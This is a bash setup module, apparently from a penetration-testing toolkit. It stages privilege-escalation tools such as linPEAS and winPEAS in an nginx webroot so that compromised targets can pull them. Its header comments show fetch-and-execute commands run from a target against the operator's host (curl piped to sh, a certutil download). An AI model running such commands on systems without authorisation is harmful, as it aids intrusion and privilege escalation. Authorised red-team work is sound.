#!/usr/bin/env bash
# 85-webtools.sh — stage the target-side tooling that module 35's nginx serves.
#
# Module 35 stands up a quiet static host on :80 with an EMPTY webroot. This is
# what fills it: /var/www/html/tools becomes the drop point a shell on a target
# pulls from — `curl http://you/tools/linpeas.sh | sh`, `certutil -urlcache -f
# http://you/tools/winPEASx64.exe`.
#
# Two manifests feed it:
#   tools.d/webroot.copy  files modules 60/80 already fetched, copied in
#   tools.d/webroot.gh    release assets nothing else installs (PEASS-ng)
#
# Ordering: this has to run AFTER 60 and 80, not next to 35 — everything in
# webroot.copy is put on the box by those two. Numbered 85 for that reason.
[ -n "${W1LD0S_ROOT:-}" ] || { W1LD0S_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"; source "$W1LD0S_ROOT/lib/common.sh"; }

WEBROOT="${WEBROOT:-/var/www/html}"
WEBTOOLS="$WEBROOT/tools"

if [ ! -d "$WEBROOT" ]; then
  warn "$WEBROOT does not exist — run module 35 first; skipping"
  return 0 2>/dev/null || exit 0
fi

# Module 35 chowns the webroot to this user so payloads drop in without sudo.
# Match that for the subdirectory, and cope with a box where 35 has not run.
if [ ! -d "$WEBTOOLS" ]; then
  sudo mkdir -p "$WEBTOOLS" || { warn "could not create $WEBTOOLS"; return 0 2>/dev/null || exit 0; }
fi
# Outside the guard on purpose, the way module 35 chowns the webroot itself every
# run. Inside it, a directory that ended up root-owned — a failed chown here, or
# anything else that created it — would fail the writability check below on this
# run and every run after, with nothing left that could ever repair it.
sudo chown "$(id -un):$(id -gn)" "$WEBTOOLS" || warn "could not chown $WEBTOOLS"
[ -w "$WEBTOOLS" ] || { warn "$WEBTOOLS is not writable by $(id -un) — skipping"; return 0 2>/dev/null || exit 0; }

# --- files already on the box ----------------------------------------------
log "Staging local tools into $WEBTOOLS…"
copied=0; unchanged=0; absent=0
while IFS= read -r rel; do
  matched=0
  # Deliberately unquoted: the manifest rows are globs.
  # shellcheck disable=SC2086
  for src in $HOME/$rel; do
    [ -f "$src" ] || continue
    matched=1
    dest="$WEBTOOLS/$(basename "$src")"
    if cmp -s "$src" "$dest" 2>/dev/null; then
      unchanged=$((unchanged + 1))
    elif cp -f "$src" "$dest"; then
      copied=$((copied + 1))
    else
      warn "webroot: could not copy $src"
    fi
  done
  # Not a failure: it means the module that installs this row did not run, or
  # its own fetch warned. Name it so the gap is visible rather than silent.
  [ "$matched" -eq 1 ] || { warn "webroot: nothing matches ~/$rel"; absent=$((absent + 1)); }
done < <(read_list webroot.copy)
log "staged from box: $copied new, $unchanged already current, $absent missing"

# --- release assets nothing else installs -----------------------------------
log "Fetching webroot-only release assets…"
while read -r repo glob name; do
  gh_release "$repo" "$glob" "$WEBTOOLS/$name" || true
done < <(read_list webroot.gh)

# nginx reads as www-data. cp preserves the source mode, and a 0600 source (or
# a restrictive umask on the mkdir above) serves as a 404 with nothing in the
# log to explain it, so set the modes here rather than trusting what came in.
chmod 755 "$WEBTOOLS" 2>/dev/null || true
find "$WEBTOOLS" -maxdepth 1 -type f -exec chmod 644 {} + 2>/dev/null || true

count=$(find "$WEBTOOLS" -maxdepth 1 -type f | wc -l | tr -d ' ')
ok "$count files staged in $WEBTOOLS"
log "Check one from the box:  curl -sI http://127.0.0.1/tools/linpeas.sh"
